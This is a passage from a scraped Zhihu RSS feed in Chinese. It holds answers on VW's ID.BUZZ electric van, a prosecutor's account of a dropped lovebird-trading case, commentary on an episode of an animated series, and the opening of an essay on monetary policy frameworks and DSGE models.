data-watermark-src=\"v2-105207ae1006dbc0842c5add8fccd6dd\" data-private-watermark-src=\"v2-9947f8de8d27ff3857cbb751c319b57b\"></p>\n<ul><li data-pid=\"l10o7-fA\">还有动漫二次元也是经常出现的T1，就问你过不过瘾。</li></ul>\n<p><img src=\"https://pic4.zhimg.com/v2-6d2826a3e1398999b475d41346245825_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"360\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6d2826a3e1398999b475d41346245825\" data-watermark-src=\"v2-6a2dfa671a67f04837006787a8312d27\" data-private-watermark-src=\"v2-82ad2229523876aa84991e6b5e89f92b\"></p>\n<p><br></p>\n<p data-pid=\"oihuk7OU\"><b>大众的超前布局—半个世界前的e-Bulli电动概念车</b></p>\n<p data-pid=\"dTrknYPI\">准确来说，e-Bulli电动概念车是大众商用车把一辆T1 Samba厢式车进行重新设计，并经过彻底电动化改装变身而来。T1当年的产量很大，世界各地还有一些收藏品，但旧款的动力系统很多不能正常工作。所以大众最先进的电动机安装在T1，产品主要参数；电机输出61 kW（83 PS）和212 Nm扭力，采用后轮驱动模式。</p>\n<p data-pid=\"ht00IVny\">e-Bulli最高车速可以达到130km/h，而旧版汽油引擎的T1最高速度为105km/h，新车续航里程超过<b>200km。数据放在今天确实不咋滴，但放到上个世纪六十年代，算是非常强的技术能力了。</b></p>\n<p data-pid=\"DMH6Il8H\">e-Bulli车内智能化，其实已经拥有<b>行车电脑显示屏、蓝牙、USB</b>等现代设备，如果那个时代是电动化，或许真的没有特斯拉什么事儿了。不由感慨大众确实牛逼，未来能不能继续牛逼，还得看电动化突破。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5c70e78476d0454314b70bf4687fcf89_720w.jpg?rss\" data-rawwidth=\"1728\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"e-Bulli电动概念车\" data-watermark=\"watermark\" data-original-src=\"v2-5c70e78476d0454314b70bf4687fcf89\" data-watermark-src=\"v2-e5f7b0fe3f443419466b7a0c04a0209d\" data-private-watermark-src=\"v2-9e999348c01da3185cebf50ea6b7fc0f\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0fc5ce513e6317c2e1709aaddf8111e2_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"780\" data-size=\"normal\" data-caption=\"e-Bulli电动概念车-液晶仪表SOC显示屏\" data-watermark=\"watermark\" data-original-src=\"v2-0fc5ce513e6317c2e1709aaddf8111e2\" data-watermark-src=\"v2-5b509a602d978ada5a977e0ebd9e2997\" data-private-watermark-src=\"v2-95a9e6013cd030c5831586e62dec3a56\"></p>\n<p><br></p>\n<p data-pid=\"uXOBs4PL\"><b> 说下大众ID.BUZZ值得关注的点</b></p>\n<ul>\n<li data-pid=\"Bi1ftKg0\"><b>造型延续经典，采用ID.家族化设计语言其纯电动化“复活”，亲和力的外表让更多人的关注，讨巧的设计相信在消费者主张个性化的时代多了一款个性标签的车型选择。</b></li>\n<li data-pid=\"cSiT5zRm\"><b>MEB平台技术，能快速的量产适配并推向市场，给大众ID系列加码，多了一位家族成员</b></li>\n<li data-pid=\"p9Qxhznj\">配置方面，ID.BUZZ量产版将搭载<b>LED大灯</b>，<b>液晶大屏</b>等，内部采用<b>三排座椅布局</b>，以便迎合更多家庭的使用需求。灵活的空间布置可满足多种场景的自由组合，也是该车的优势。</li>\n<li data-pid=\"QfZfPdW6\">个性化且具有亲和力的内饰设计，主流的人机交互和智能座舱硬件配置符合智能电动汽车的特点，希望新潮、趣玩的年轻人绝对吸引力</li>\n<li data-pid=\"vJsHMeek\">产品力：预计会搭载60kWh和111kWh两种电池组，续航可达到300km和560km。配备150kW的电机，最大功率204Ps，峰值扭矩310N·m，零百加速9秒以内，最高时速145km/h。<b>提供5座版和厢式货车</b>两个版本，这个定位的车型，有这些账面数据貌似还不错</li>\n</ul>\n<p><img src=\"https://pic2.zhimg.com/v2-8f2974cab7e81e5e1f1367c3ee58088b_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"359\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8f2974cab7e81e5e1f1367c3ee58088b\" data-watermark-src=\"v2-c81105212866a94f302a7cf4e851a63c\" data-private-watermark-src=\"v2-f6f4f1b79e8a1a698a19173e7ef95cb0\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0b059a4049c77db05b0fead4e3fe5942_720w.jpg?rss\" data-rawwidth=\"1728\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"ID.BUZZ\" data-watermark=\"watermark\" data-original-src=\"v2-0b059a4049c77db05b0fead4e3fe5942\" data-watermark-src=\"v2-5b5586a7021fd4a1d5f0aae650d120d8\" data-private-watermark-src=\"v2-e4f36b7583877cdac8d2f973ed6762e5\"></p>\n<h3><b>ID.BUZZ能打开中国市场销量密码？</b></h3>\n<p data-pid=\"IW9hrYpW\">大众ID.BUZZ的概念车早在2017年便已经发布，量产版本亮相也将带动国内MPV市场，以弥补大众在此领域的竞争力匮乏问题。</p>\n<p data-pid=\"0v6_Q4k9\">随着中国社会三胎政策放宽以及多孩子家庭的增多，MPV在中国市场或将成为新的需求增长点，读懂中国市场政策和消费趋势的大众这一回真的懂了吗？</p>\n<p data-pid=\"byVRgeiK\">ID.BUZZ能否打开中国市场销量痞子觉得除了以上，还有以下几个方面，</p>\n<ul>\n<li data-pid=\"hHjmg25L\">\n<b>中国消费者缺少这种的文化认同，这张“致敬经典”的牌某些中国自主品牌已经用得如火纯情，大众这次能行吗？</b>。</li>\n<li data-pid=\"ekKpkxlZ\"><b>定位有点模糊尴尬，拉货吧，真的不如五菱宏光性价比高。载客家用MPV吧，可选择的品牌、车型太多</b></li>\n<li data-pid=\"La3Z47Au\"><b>关键还得看价格，从发布的消息看，起售价为4.5万欧（约合人民币39.4万元），花四十万买个面包车，也就那些有钱且喜欢彰显个性的主会考虑吧，拉货可不行，太费了吧。</b></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cai-niu-niu-14?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">痞子蔡</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/521084132/answer/2382685149?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/363430562?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价大众的纯电动MPV ID buzz？</a><br><a href=\"http://www.zhihu.com/question/25580234?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">国产MPV车型里，最好的是哪个车型，求懂行的朋友给介绍下？</a><br>\n","link":"http://www.zhihu.com/question/521084132/answer/2382685149?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"繁育涉保鹦鹉卖 380 元有可能判十年，最终不予起诉；争议背后，有哪些法律细节值得关注？","date":"2022-03-10 05:42:41","description":"\n<p data-pid=\"LNzmc0s6\"><b>知乎的网友大家好，我是该案的办案检察官。就这个案件，我来谈一谈。</b></p>\n<p data-pid=\"tcQGeA-B\"><b>问题1繁育涉保鹦鹉卖400元要被判十年？</b></p>\n<p data-pid=\"DQGhC10O\">        今年34岁的王某是河南省商丘人，文化程度不高，是一位单亲妈妈，一个人带着8岁的女儿，女儿身体不好，经常生病住院。为了挣钱给女儿看病，2019年她养起了费氏牡丹鹦鹉（下简称费氏鹦鹉），并成为她的主要生活来源。2020年9月上旬，她以每对25元的价格将30只费氏鹦鹉销售给当地的鸟店经营者田某。随后，田某又将上述鹦鹉连同自己从他处收购的共计44只费氏鹦鹉，以每对35元的价格转售给江苏省新沂市鹦鹉养殖户刘某。9月16日，该批鹦鹉在徐州汽车站转运时被徐州警方查获，随后公安机关又在商丘王某的家中起获147只费氏鹦鹉。经鉴定，以上鹦鹉均为《濒危野生动植物种国际贸易公约》附录Ⅱ所列费氏鹦鹉，被核准为国家二级重点保护野生动物而禁止交易。依照现行相关法律规定，非法交易10只费氏鹦鹉就要面临十年以上刑期。</p>\n<p data-pid=\"1KxG8PTn\">        在上级检察机关领导和支持下，经过大量工作，2021年11月9日，徐州铁路运输检察院（以下简称“徐州铁检院”）对王某等三人公开宣布绝对不起诉（出罪）决定。</p>\n<p data-pid=\"HNV0xp9v\"><b>问题2多起「鹦鹉案」争议背后，有哪些法律细节值得关注？</b></p>\n<p data-pid=\"L06-o163\">        徐州铁检院受理该鹦鹉案后，我发现根据最高人民法院《关于审理破坏野生动物资源刑事案件具体应用法律若干问题的解释》的规定，珍贵、濒危野生动物包括驯养、繁殖的相关物种，定罪量刑上也未区分人工繁育野生动物与野外种群。此案中的费氏鹦鹉，被核准为国家二级保护动物，王某、田某和刘某均构成危害珍贵、濒危野生动物罪，非法交易10只，法定刑为十年以上有期徒刑。30只费氏鹦鹉尚不足400元，王某获利更是微乎其微，要判这么重的刑罚，3名犯罪嫌疑人觉得很委屈。我也觉得疑惑，遂赴商丘多次深入调研，了解到费氏鹦鹉在河南商丘有20余年的人工繁育历史，技术成熟，已成规模，成为当地不少群众脱贫致富的途径。鹦鹉已经成为了一种喜闻乐见的宠物，一般社会大众难以认识到其珍贵、濒危，如对交易人工繁育鹦鹉的行为予以刑事处罚，与群众的朴素法治观念有一定冲突。因此，在办理破坏野生动物资源保护案件中，判断非法交易野生动物是否具有社会危害性，不能仅依靠机械查阅法条和名录来认定属于“珍贵、濒危野生动物”，应当进行实质深入审查，需综合考虑涉案动物是否人工繁育，人工繁育技术水平及规模，是否纳入技术成熟名录，行为手段、商业经营利用对野生动物的损害程度等因素。依托公开听证会、专家论证会等途径多方听取意见，实地走访调研等方式全面审查，进行实质性研判。案件处理要结合时代背景、野生动物保护实际和社会民生，能动履职，依法作出妥当处理，努力实现政治效果、社会效果、法律效果相统一。</p>\n<p data-pid=\"p5a76Ts8\">       案件办结后，我又去商丘回访，在遇到一家鹦鹉养殖户时，他动情的说：“之前因为买卖鹦鹉，各地公安纷纷来商丘抓人，现在你们这个案子能不按犯罪处理，我们养殖户终于看到希望了，天亮了！我嘴笨不会说话，我就从心里感觉共产党好！”</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xun-zhao-ling-yizhi-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">范璞</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/519987830/answer/2382399850?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">61 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/41004168?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">嫖娼被抓，警察通知家属及单位，造成我声誉上的损失，仅从法律上说，我能不能起诉？</a><br><a href=\"http://www.zhihu.com/question/462315723?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">野生动物为什么受法律保护？</a><br>\n","link":"http://www.zhihu.com/question/519987830/answer/2382399850?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"如何评价《画江湖之不良人》第 5 季第 9  集？","date":"2022-03-10 05:33:15","description":"\n<p data-pid=\"cx2BDAjq\">大好我鱼今九。<br><br>首先让我们热烈欢迎漂泊的水手温韬和上官云巧儿归来，久违的“星云~~~”也回来了，之前大家应该很疑惑8集开头是谁在帮老李调查传信，正是这俩活宝，二人的回归也让老李轻松了不少，笑容也多了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d967f85eec4ee113fdbecea6fc6021b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5118\" data-rawheight=\"2124\" data-watermark=\"watermark\" data-original-src=\"v2-d967f85eec4ee113fdbecea6fc6021b6\" data-watermark-src=\"v2-e2ac347b0206a65b8b70fc35639468e5\" data-private-watermark-src=\"v2-e9bdc10f6d527cae11e67fdbf06ef89b\"></p>\n<p data-pid=\"GKQQk03z\">我也不打哑谜了，老李看上了大帅的位子，上一回在三千院的“配合”下，老李兵不血刃给予了不良人们震慑，一记驱虎吞狼覆灭了总舵但也变相保住了不良人的大部队(感谢拆迁队大队长李存礼)。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ffc2502d85b19dd1587b05993b5a6cf8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5108\" data-rawheight=\"2106\" data-watermark=\"watermark\" data-original-src=\"v2-ffc2502d85b19dd1587b05993b5a6cf8\" data-watermark-src=\"v2-f13fe48194c38dd785a2262527cfa508\" data-private-watermark-src=\"v2-970a17aea9111a63ff7f467312f82c39\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2f8f5694c456bcc47337074ae906711a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5098\" data-rawheight=\"2118\" data-watermark=\"watermark\" data-original-src=\"v2-2f8f5694c456bcc47337074ae906711a\" data-watermark-src=\"v2-3e044f8fc0e6748b0441ce8c5f62685a\" data-private-watermark-src=\"v2-48f0b026dbfac8598d5aa5d2529ead3f\"></p>\n<p data-pid=\"iQhaSgrB\">但只凭震慑还是不足以扭转不良人们长期以来的固有思想，虽说老李现在武力超群，但他不会选择以武力去降服不良人，他需要的不仅仅是得到不良人的身体还要得到不良人的心！他不是袁天罡也成为不了袁天罡，他只能趟出一条属于自己的路。同理三千院也心中清楚，所以他没有进一步推进，而是再次伪装去获取信息同时遣骆小北再次回归，继续跟进老李他们的动向，他需要老李做的更多。（大家觉得Intro里的镜心魔是镜心魔呢还是三千院呢？）<br><br>在我们的设定中，天藏星三千院没有绝顶的武功却能坐镇总舵暂代不良帅之职，是因为他的能力可以让他在任何时候保全自己，只要他不想，就没人知道他是谁他在哪儿。然而他在老李面前却自曝好几次了，他心里清楚老李不会拿他怎么样，而且三千院的“配合”是单方面的，老李目前并不知情，上一回也没有刻意的去往那个方向拍，当然聪明的观众一眼就看懂了。这里再借机说一下不良人三十六星宿的命名问题，我们最早的确是借鉴的水浒三十六天罡，但这些不良人可有太多能说道的了。他们不同于通文馆的十三太保和幻音坊九天圣姬，我们希望能在未来对于他们的刻画更自由更有意思（毕竟我们是原创嘛）。举个例子，如果本人也是不良人！那他可以叫天搞星，或者我们跟现实或者某个IP进行联动，比如“贝贝漫”，不是江湖人称天贝星嘛~（第一次看她的解析，我直接去找的老杨，问他这是不是自己人……别人是分析她是在刨坟doge）所以三千院一开始是叫天藏（cang）星，只是后来我觉得他特能藏就叫藏实在是土，天藏（zang）星念起来更霸气，同时兼顾cang的意思。<br><br>再说回本集，这一集有些平淡，因为要汇集之前的各种信息同时为接下来的展开做铺垫，当然这也是最后的平淡了。不知道大家还记不记得第7集最后，李存礼告知李嗣源他要找的人找到了，而李嗣源却露出有些忧伤的神情，深沉的说“三日后，启程太原”。因为他找不到温韬就找不到他想要的东西，只能启动第二个方案——毁掉太原。李嗣源生于太原，而如今，他却要亲手将其毁掉。他李嗣源再冷血再狠毒也是人，人，孰能无情。只是苦了我们的上饶公主，前有百分百空手接白刃，现有百分百被李嗣源绑。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8199685faa8baf9336aaa131b1d885f4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5114\" data-rawheight=\"2118\" data-watermark=\"watermark\" data-original-src=\"v2-8199685faa8baf9336aaa131b1d885f4\" data-watermark-src=\"v2-aab4a3e87a9e312c445bb19ce9d38e0d\" data-private-watermark-src=\"v2-fb30979b23a6e5a239b3403ec3e1a0e8\" data-tags=\"porn\"></p>\n<p data-pid=\"kYjBC2d3\">李嗣源已称监国，日思夜想的帝位近在咫尺，他要毁太原绝不能为他人道，因为他是一个好监国也将会是一个好皇帝！我们是演义，不能脱离史实。于是他绑架了上饶威胁焊魃给他日以继夜的制作火药，再嫁祸给“欲弑天子大逆不道”的不良人。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d0833da87e52710d029b78dc6415617d_720w.jpg?rss\" data-caption=\"我老喜欢他这个表情了，之前忘记放了\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"852\" data-watermark=\"watermark\" data-original-src=\"v2-d0833da87e52710d029b78dc6415617d\" data-watermark-src=\"v2-16d52ec12ddea2489a0ad49a768bfa75\" data-private-watermark-src=\"v2-398bcaf57d95b2d0763649d004bc6730\"></p>\n<p data-pid=\"xlGP6qTm\">而痴情的焊魃和审美堪比阿姐的上饶在一起，很般配，放心他俩不刀。<br><br>最后再说说我近期了解到的一些情况，有关心我们的粉丝觉得我们公司快要倒闭了。首先感谢大家的关心，目前的情况是我们公司的管理层正在积极与各方协商寻求解决方案，据我所知没那么悲观。我能保证的是第六季也许会迟到但绝对不会缺席！还有粉丝以为我们换了主创团队并且不良人废导演，虽然制作团队换了一波血，但主创团队一直都没换过，不但没换还在一直补充新鲜的血液，我们需要更新的思维和更多样的风格，老带新一直是若森的传统。如今通过第五季我们制作团队也有了起色，我相信未来会更好！再次感谢粉丝儿们的关心~笔芯~<br><br>当然废导演是真的。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/qiu-dao-yu-5-64?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">十万个秋刀鱼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/519830352/answer/2382566123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">75 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/518404828?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第五季第七集?</a><br><a href=\"http://www.zhihu.com/question/512510588?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第五季？</a><br>\n","link":"http://www.zhihu.com/question/519830352/answer/2382566123?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"艰难一跃 | 从美联储走过的弯路看我国货币政策框架改革（笔记012)","date":"2022-03-10 04:39:05","description":"\n<p data-pid=\"lpXl-Tne\">经过多年努力，我国的利率市场化改革进入最后攻坚阶段。12月2日，易行长在《建设现代中央银行制度》中提出了现代货币政策框架的目标：优化的货币政策目标体系、创新的货币政策工具体系、畅通的货币政策传导机制。</p>\n<p data-pid=\"Ab34cqiV\">这里试图结合近期央行的多篇报告，从交易的角度谈一下对建设现代货币政策框架的理解:</p>\n<ol>\n<li data-pid=\"8wgDbpi9\">为什么很多央行使用DSGE模型沟通货币政策？泰勒规则在DSGE模型中处于什么角色？</li>\n<li data-pid=\"DOVMaTKu\">为什么人民币短期利率波动较大？从货币政策中介目标不同谈数量型调控和价格型调控对政策利率波动性的影响。</li>\n<li data-pid=\"7qm69LNP\">为什么说保障货币政策传导机制流畅的根本是价格的可交易性（tradable）。​甚至将预期也变得可交易，是打通传导机制的关键。</li>\n</ol>\n<hr>\n<h2>一、为什么很多央行使用DSGE宏观模型沟通货币政策？</h2>\n<p data-pid=\"nEtPzsFF\">为了提升透明度，欧美央行近些年的一个主要工作是推动与公共沟通的规范化。具体说，就是努力与市场磨合出同一套讨论框架。</p>\n<p data-pid=\"C_0e_rDb\">这个讨论框架就是动态随机一般均衡模型（Dynamic Stochastic General Equilibrium）。虽然跟所有宏观模型一样，DSGE的参数多、估计旷量大，但作为讨论框架还是有很多的优点：</p>\n<ul>\n<li data-pid=\"zK_BT_X2\">DSGE是整体均衡模型，是在整个经济框架内解释生产、消费和价格的相互影响。可以避免讨论时不同人盯着局部指标自说自话，鸡同鸭讲，而忽略了经济的反馈和联动效应。这非常适合央行研究政策组合的传导渠道及其之间的相互作用；</li>\n<li data-pid=\"8j3Y5GK_\">DSGE是动态随机的，可以更好的描述多期间连续博弈下，各部门不断受到外部冲击后，预期了别人预期，也预期别人预期了自己的预期后的动态最优决策行为。可以帮助研究人员讨论随机扰动下，经济体多部门层层预期套娃后均衡状态的变化。</li>\n<li data-pid=\"Ra3KRr1f\">DSGE是由微观经济学基础推导出的宏观经济学模型，它是一种非常容易扩展的结构模型。与简化模型相比，更强调各变量之间的逻辑关系，而不是统计关系。这让无法做对照组实验的宏观政策，能够以理服人。</li>\n</ul>\n<p data-pid=\"ZujvtWo_\">下图展示的是DSGE模型在制定货币政策中的应用。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a429d66c7a702f7081bdf722f16de044_b.jpg\" data-size=\"normal\" data-rawwidth=\"1194\" data-rawheight=\"669\" class=\"origin_image zh-lightbox-thumb\" width=\"1194\" data-original=\"https://pic1.zhimg.com/v2-a429d66c7a702f7081bdf722f16de044_r.jpg\"><figcaption>图1. DSGE模型结构示意图 （图片：美联储）</figcaption></figure><p data-pid=\"duahXkuB\">左边是需求侧（Demand），展示了需求的决定函数：现在的需求 <img src=\"https://www.zhihu.com/equation?tex=Y\" alt=\"Y\" eeimg=\"1\"> 是真实利率（名义利率 <img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"i\" eeimg=\"1\"><img src=\"https://www.zhihu.com/equation?tex=-\" alt=\"-\" eeimg=\"1\"> 通胀预期 <img src=\"https://www.zhihu.com/equation?tex=%5Cpi%5E%7Be%7D\" alt=\"\\pi^{e}\" eeimg=\"1\"> ）和未来需求预期 <img src=\"https://www.zhihu.com/equation?tex=Y%5E%7Be%7D\" alt=\"Y^{e}\" eeimg=\"1\"> 的函数。这个函数描述的关系是实际利率较高时，人们会更喜欢储蓄而减少消费；而未来需求预期更高时（对未来更乐观），人们则更敢于消费，而不是储蓄。</p>\n<p data-pid=\"NchWOKTX\">模型假设经济能出清，所以需求等于产出。为了避免引入过多符号， <img src=\"https://www.zhihu.com/equation?tex=Y\" alt=\"Y\" eeimg=\"1\"> 也用来表示产出。</p>\n<p data-pid=\"S_yuvuEC\">右边是供给侧（Supply），展示了通胀的决定函数：即企业如何根据需求水平设定产品价格。当期通胀 <img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\\pi\" eeimg=\"1\"> 是产出 <img src=\"https://www.zhihu.com/equation?tex=Y\" alt=\"Y\" eeimg=\"1\"> 和未来通胀预期 <img src=\"https://www.zhihu.com/equation?tex=%5Cpi%5E%7Be%7D\" alt=\"\\pi^{e}\" eeimg=\"1\">的函数。这个函数描述的关系是产出对通胀的传导。当产出较高时，企业会增加工资吸引员工加班生产。高工资增加了产品成本，也提高了人们的支付能力，从而带来通胀。同时，对未来通胀预期越高，企业也会让产品更多地涨价，引起更高的通胀。</p>\n<p data-pid=\"anVHNrql\">下端是货币政策（Monetary Policy）。央行通常根据货币政策目标设定合意的通胀和产出水平，并把短期名义利率用做政策工具。根据短期名义利率 <img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"i\" eeimg=\"1\"> 与通胀 <img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\\pi\" eeimg=\"1\"> 和产出 <img src=\"https://www.zhihu.com/equation?tex=Y\" alt=\"Y\" eeimg=\"1\"> 的函数关系，当经济过热，通胀过高时，央行会提高短期利率，通过图中需求、供给、货币政策的循环影响，抑制需求，进而抑制通胀。当产出、通胀过低时，降低短期利率，提振需求，抬高通胀。</p>\n<p data-pid=\"5kd7WuvL\">下图展示的是美联储DSGE模型中货币政策端使用的具体函数形式：一个带随机政策扰动的动态泰勒规则。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ac3875b28e1647bcc31f3ea2e651d319_b.png\" data-size=\"normal\" data-rawwidth=\"3034\" data-rawheight=\"246\" class=\"origin_image zh-lightbox-thumb\" width=\"3034\" data-original=\"https://pic2.zhimg.com/v2-ac3875b28e1647bcc31f3ea2e651d319_r.jpg\"><figcaption>图2. 美联储DSGE模型中使用的动态泰勒规则 （图片：美联储）</figcaption></figure><p data-pid=\"bHVaYDMo\">最初，泰勒规则是1993年John Taylor根据1987到1992年间格林斯潘使用的利率政策总结的一个经验规则。该规则表达的是央行会设定通胀和产出目标，并根据通胀缺口和产出缺口来设置短期名义利率。</p>\n<p data-pid=\"q5tt2IkK\">由于该规则具有简单、方便的函数形式，并且与美联储的实际操作非常接近，所以后来成为DSGE模型中最常用的货币政策决策函数。这一版泰勒规则就是根据DSGE的精神，扩展了货币政策的随机扰动项，以更好地模拟货币政策的不确定性对各部门决策和预期的影响。</p>\n<p data-pid=\"jaNZ3IKW\"><b>预期的重要性</b></p>\n<p data-pid=\"thIg8PiZ\">与传统静态的IS-LM宏观模型相比，DSGE引入了外生的随机扰动：需求端的需求冲击（Demand shocks）、供给端的生产率冲击（Productivity shocks）和加价冲击（Mark-up shocks）、和货币政策端的政策冲击（Policy shocks）。这使DSGE具备对不确定性进行微观建模的能力，可以让政策制定者更好地分析随机扰动在经济体中的传导。</p>\n<p data-pid=\"l2aq1iof\">由于不确定性的存在，各部门会在决策时预期其他人对随机扰动所作的的反应。从图1中循环路径可以看出，当前通胀对产出和未来通胀预期的依赖关系，而产出和通胀预期又受到未来货币政策路径的影响。经济各部门的最优方案不是一个时间切面的一个决策，而是跟随随机扰动不断变化的一系列决策行为。</p>\n<p data-pid=\"RD0qUprt\">DSGE模型模拟的正是这样一个大型的博弈场。与真实世界里一样，大家更关注央行释放的预期，而不是当下的一次政策利率调整。</p>\n<p data-pid=\"SxYzVIUY\">从DSGE模型中可以看出，管理货币政策释放的预期，是调节经济更有效的通道。</p>\n<hr>\n<h2>二、为什么我国短期利率波动那么大？管理货币数量 vs 管理货币价格</h2>\n<p data-pid=\"G19G_ITo\">IRS做市商肯定都被国内市场短期利率的巨大波动折磨过。</p>\n<p data-pid=\"9r34Kvyz\">美元IRS做市商做完关键久期对冲后，就可以安心睡觉了。因为短期利率非常稳定，每日变动只有一两个bp，浮动端的错配不会带来多大损益。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-44d608b54b6c4a7fb2b75b2cdb81b04b_b.jpg\" data-size=\"normal\" data-rawwidth=\"842\" data-rawheight=\"390\" class=\"origin_image zh-lightbox-thumb\" width=\"842\" data-original=\"https://pic4.zhimg.com/v2-44d608b54b6c4a7fb2b75b2cdb81b04b_r.jpg\"><figcaption>图3. 联邦基金利率与美联储设定的利率走廊 （图片：彭博）</figcaption></figure><p data-pid=\"REf6z5bC\">但人民币IRS多空头寸的浮动端没有逐日匹配的话，每日定盘价的大幅波动也会带来意想不到的损益。图4显示，银行间质押利率DR001的每天波动有几十bp，甚至几百bp。今天的定盘和明天的定盘带来的损益非常随机。</p>\n<p data-pid=\"zUhLC1NU\">现券交易员也面临类似的问题。短期利率的波动，甚至是短期资金的可得性，是影响国内债券买卖最关键的因素。如果资金紧张，投资者会选择卖出整条曲线上的债券，毕竟相对其他资产，利率债最方便变现。</p>\n<p data-pid=\"FsXzZDD2\">市场对央行每天资金投放的关注，高于对未来经济的关注。利率曲线的变动更像对未来几天资金投放的猜测。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-fece2a30ba8dd0347318483495ecc424_b.jpg\" data-size=\"normal\" data-rawwidth=\"915\" data-rawheight=\"392\" class=\"origin_image zh-lightbox-thumb\" width=\"915\" data-original=\"https://pic1.zhimg.com/v2-fece2a30ba8dd0347318483495ecc424_r.jpg\"><figcaption>图4. DR001每日的波动经常有几十甚至几百bps（图片：Wind）</figcaption></figure><p data-pid=\"EgI98Fu3\"><b>美联储管控短期利率之路</b></p>\n<p data-pid=\"f4Ox6zmR\">8月31日，央行白皮书《参与国际基准利率改革和健全中国基准利率体系》中再次提到“中国银行间基准利率体系建设的重点在于推动各类基准利率的广泛运用，通过创新和扩大DR在浮息债、浮息同业存单等金融产品中的运用，将其打造为中国货币政策调控和金融市场定价的关键性参考指标。”</p>\n<p data-pid=\"v2lBTg0d\">如果将短期利率用作基准利率，但又担心短期利率大幅波动对挂钩产品的随机扰动，我们不妨看看美元是如何驯服短期利率波动的。</p>\n<p data-pid=\"nbXe5orb\">在80年代之前，美联储实行的也是以货币供应量为中介目标的数量型调控，这与我国目前的做法类似。美联储通过公开市场操作（Open Market Operations）调节银行存款准备金（Reserve），利用货币乘数来调节货币总量，最终影响经济。</p>\n<p data-pid=\"UJgLnvRg\">数量型调控的思想根源是费雪的货币数量论。即交易量乘价格等于货币量乘货币流通速度。当交易量和货币流通速度不变时，物价水平取决于货币数量。央行调节基础货币，通过货币乘数来控制货币数量，并影响物价。国内关注的M2、社融等指标都是数量型调控的特点。</p>\n<p 